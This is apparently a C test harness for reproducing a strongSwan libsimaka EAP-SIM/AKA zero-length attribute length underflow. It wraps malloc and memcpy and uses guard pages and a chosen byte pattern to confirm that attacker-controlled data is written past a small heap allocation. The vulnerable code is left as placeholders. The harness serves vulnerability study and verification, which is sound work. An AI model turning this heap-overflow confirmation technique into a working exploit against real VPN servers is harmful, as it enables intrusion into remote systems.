// Frontier harness for strongSwan CVE-2026-35330 (libsimaka EAP-SIM/AKA
// zero-length attribute underflow). The three blocks between BEGIN/END
// markers are extracted verbatim from a pinned release by run.sh; everything
// else is a harness stub. Boundary and collaborator list: PROVENANCE.md.
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <sys/mman.h>

#define TRUE true
#define FALSE false
#define METHOD(iface, name, ret, ...) static ret name(__VA_ARGS__)

// Harness stand-in for the pinned shape in utils/chunk.h.
typedef struct { char *ptr; size_t len; } chunk_t;
static chunk_t chunk_create(void *p, size_t n)
{
	chunk_t c; c.ptr = (char*)p; c.len = n; return c;
}
static chunk_t chunk_skip(chunk_t c, size_t n)
{
	chunk_t r;
	size_t s = (n > c.len) ? c.len : n;
	r.ptr = c.ptr + s; r.len = c.len - s; return r;
}

// Pinned enum values, verbatim subset of src/libsimaka/simaka_message.h:67-92.
typedef enum {
	AT_RAND = 1, AT_AUTN = 2, AT_RES = 3, AT_AUTS = 4, AT_PADDING = 6,
	AT_NONCE_MT = 7, AT_PERMANENT_ID_REQ = 10, AT_MAC = 11,
	AT_NOTIFICATION = 12, AT_ANY_ID_REQ = 13, AT_IDENTITY = 14,
	AT_VERSION_LIST = 15, AT_SELECTED_VERSION = 16,
	AT_FULLAUTH_ID_REQ = 17, AT_COUNTER = 19, AT_COUNTER_TOO_SMALL = 20,
	AT_NONCE_S = 21, AT_CLIENT_ERROR_CODE = 22, AT_IV = 129,
	AT_ENCR_DATA = 130, AT_NEXT_PSEUDONYM = 132, AT_NEXT_REAUTH_ID = 133,
	AT_CHECKCODE = 134, AT_RESULT_IND = 135
} simaka_attribute_t;

// Pinned structs, verbatim from src/libsimaka/simaka_message.c:50-67.
struct attr_hdr_t { uint8_t type; uint8_t length; } __attribute__((__packed__));
struct attr_t { simaka_attribute_t type; size_t len; char data[]; };
typedef struct attr_hdr_t attr_hdr_t;
typedef struct attr_t attr_t;

typedef struct { void (*insert_last)(void *, void *); } linked_list_t;
typedef struct {
	linked_list_t *attributes;
	chunk_t mac, encr, iv;
	bool encrypted;
	bool p_bit;
} private_simaka_message_t;

static int g_reject = 0;
static int g_add_calls = 0;
static void *g_last_malloc = NULL;
static size_t g_last_malloc_size = 0;
static size_t g_copy_len = 0;
static char *g_attr_data = NULL;
static int g_intercept_next = 0;
static size_t g_data_off = 0;
#ifndef __SANITIZE_ADDRESS__
static unsigned char *g_dest_region = NULL;
#endif

// Plain build only: log the exact length the pinned memcpy requests, then do
// the real copy. ASan build leaves memcpy untouched so its interceptor names
// the pinned caller in the report.
#ifndef __SANITIZE_ADDRESS__
static void *lab_memcpy(void *d, const void *s, size_t n)
{
	size_t copy = n;
	g_copy_len = n;
#ifdef BOUNDED_COPY
	// Synthetic collaborator: cap the copied bytes so the chosen source can
	// be observed past the tiny allocation. Real libc faults before writing
	// under the wrapped length; see PROVENANCE.md.
	if (copy > (size_t)BOUNDED_COPY) copy = (size_t)BOUNDED_COPY;
	printf("MEMCPY_CALL requested=%zu copied=%zu\n", n, copy);
#else
	printf("MEMCPY_CALL requested=%zu copied=%zu\n", n, copy);
#endif
	return __builtin_memcpy(d, s, copy);
}
#define memcpy lab_memcpy
#endif

#define DBG1(...) ((void)0)
static bool invalid_length(simaka_attribute_t t)
{
	g_reject = 1;
	printf("REJECT reason=invalid_length type=%d\n", (int)t);
	return FALSE;
}
static bool not_encrypted(simaka_attribute_t t)
{
	g_reject = 1;
	printf("REJECT reason=not_encrypted type=%d\n", (int)t);
	return FALSE;
}
static void insert_stub(void *list, void *attr)
{
	(void)list;
	g_add_calls++;
	g_attr_data = ((struct attr_t*)attr)->data;
}

// Link-time wrapper records the small allocation without changing its size or
// allocator (--wrap=malloc). In the ASan build __real_malloc is ASan's malloc,
// so the real redzone policing still applies to the pinned memcpy.
void *__real_malloc(size_t);
void *__wrap_malloc(size_t sz)
{
	void *p;
	if (g_intercept_next) {
		g_intercept_next = 0;
#ifndef __SANITIZE_ADDRESS__
		p = g_dest_region;
#else
		p = __real_malloc(sz);
#endif
		g_attr_data = (char*)p + offsetof(struct attr_t, data);
		printf("MALLOC_CALL requested=%zu ptr=%p\n", sz, p);
	} else {
		p = __real_malloc(sz);
	}
	g_last_malloc = p;
	g_last_malloc_size = sz;
	return p;
}

// ---- PINNED add_attribute() ---------------------------------------------
// BEGIN PINNED ADD_ATTRIBUTE
@@ADD_BLOCK@@
// END PINNED ADD_ATTRIBUTE

static bool parse_one(private_simaka_message_t *this, chunk_t in,
                      chunk_t *out_in, chunk_t *out_data)
{
	attr_hdr_t *hdr;
	chunk_t data = { NULL, 0 };
	hdr = (attr_hdr_t*)in.ptr;
	*out_in = in;

	switch (hdr->type) {
// BEGIN PINNED PARSE BRANCH
@@BRANCH_BLOCK@@
// END PINNED PARSE BRANCH

// BEGIN PINNED SINK SELECT
@@SINK_BLOCK@@
// END PINNED SINK SELECT
	*out_data = data;
	*out_in = in;
	return TRUE;
}

// Chosen-source pattern, shared by both builds.
static unsigned char chosen(size_t i) { return (i & 1) ? 0xA5 : 0x5A; }

// ---- guard mapping for the plain build (rung 4 instrumentation) ----------
#ifndef __SANITIZE_ADDRESS__
static unsigned char *g_src_base;
static size_t g_src_size;
static void *g_fault_addr;

static void segv_handler(int sig, siginfo_t *si, void *ctx)
{
	size_t offs[] = { 16, 32, 64, 4096, 65536 };
	int match = 1;
	unsigned char *d = g_attr_data;
	size_t i;

	(void)sig; (void)ctx;
	g_fault_addr = si->si_addr;
	if (!d) {
		printf("HANDLER no_attr_data\n");
		_exit(4);
	}
	for (i = 0; i < sizeof(offs)/sizeof(offs[0]); i++) {
		unsigned char got = d[offs[i]];
		unsigned char exp = chosen(offs[i] + g_data_off);
		printf("CHOSEN offset=%zu got=%02x exp=%02x\n", offs[i], got, exp);
		if (got != exp) match = 0;
	}
	printf("GUARD_FAULT addr=%p src_end=%p match=%d\n",
	       g_fault_addr, g_src_base + g_src_size, match);
	fflush(stdout);
	_exit(match ? 0 : 3);
}
#endif

int main(int argc, char **argv)
{
	setvbuf(stdout, NULL, _IONBF, 0);
	int type, hlen;
	unsigned char *src;
	size_t src_size = 1024 * 1024;
	chunk_t in, after, data;
	private_simaka_message_t msg;
	linked_list_t list;
	size_t page = 4096;

	if (argc != 3) {
		fprintf(stderr, "usage: %s TYPE HDR_LEN\n", argv[0]);
		return 2;
	}
	type = atoi(argv[1]);
	hlen = atoi(argv[2]);

#ifndef __SANITIZE_ADDRESS__
	// 1 MiB chosen-filled source followed by a PROT_NONE guard page. The
	// underflowed memcpy copies forward from here until it faults.
	void *region = mmap(NULL, src_size + page, PROT_READ | PROT_WRITE,
	                    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (region == MAP_FAILED) { perror("mmap"); return 2; }
	if (mprotect((char*)region + src_size, page, PROT_NONE) != 0) {
		perror("mprotect"); return 2;
	}
	src = (unsigned char*)region;
	g_src_base = src;
	g_src_size = src_size;
	void *dest = mmap(NULL, src_size + page, PROT_READ | PROT_WRITE,
	                  MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (dest == MAP_FAILED) { perror("dest mmap"); return 2; }
	if (mprotect((char*)dest + src_size, page, PROT_NONE) != 0) {
		perror("dest mprotect"); return 2;
	}
	memset(dest, 0, src_size);
	g_dest_region = (unsigned char*)dest;
	g_intercept_next = 1;
	struct sigaction sa;
	memset(&sa, 0, sizeof(sa));
	sa.sa_sigaction = segv_handler;
	sa.sa_flags = SA_SIGINFO;
	sigaction(SIGSEGV, &sa, NULL);
#else
	// ASan build: valid heap source; only the destination write is poisoned.
	src = (unsigned char*)malloc(src_size);
	if (!src) return 2;
#endif
	for (size_t i = 0; i < src_size; i++) src[i] = chosen(i);
	src[0] = (unsigned char)type;
	src[1] = (unsigned char)hlen;
	g_data_off = (type == AT_RAND) ? 4 : 2;

	list.insert_last = insert_stub;
	memset(&msg, 0, sizeof(msg));
	msg.attributes = &list;
	msg.encrypted = false;
	msg.p_bit = true;
	in = chunk_create(src, src_size);

	bool ok = parse_one(&msg, in, &after, &data);
	int advanced = (after.ptr != in.ptr || after.len != in.len) ? 1 : 0;
	printf("PARSE_RESULT type=%d hdr_len=%d ok=%d reject=%d add_calls=%d "
	       "advanced=%d in_ptr_delta=%td in_len=%zu\n",
	       type, hlen, ok ? 1 : 0, g_reject, g_add_calls, advanced,
	       after.ptr - in.ptr, after.len);
	printf("COPY_LEN len=%zu\n", g_copy_len);
	printf("NO_PROGRESS=%d\n", advanced ? 0 : 1);
#ifdef BOUNDED_COPY
	// Bounded-copy collaborator: the pinned copy completed inside the guarded
	// mapping, so inspect the bytes it actually wrote past the tiny allocation.
	{
		size_t offs[] = { 16, 32, 64, 4096, 65536 };
		int match = 1;
		for (size_t i = 0; i < sizeof(offs)/sizeof(offs[0]); i++) {
			unsigned char got = (unsigned char)g_attr_data[offs[i]];
			unsigned char exp = chosen(offs[i] + g_data_off);
			printf("CHOSEN offset=%zu got=%02x exp=%02x\n", offs[i], got, exp);
			if (got != exp) match = 0;
		}
		printf("BOUNDED_CHOSEN match=%d copied=%d\n", match, BOUNDED_COPY);
	}
#endif
	return 0;
}
